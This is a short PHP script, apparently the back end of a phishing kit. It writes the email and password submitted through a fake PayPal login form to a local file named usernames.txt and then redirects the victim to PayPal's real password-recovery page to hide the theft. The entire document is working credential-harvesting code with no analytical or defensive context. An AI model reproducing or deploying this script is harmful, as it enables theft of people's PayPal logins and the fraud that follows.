<?php

file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . "\nPassword: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>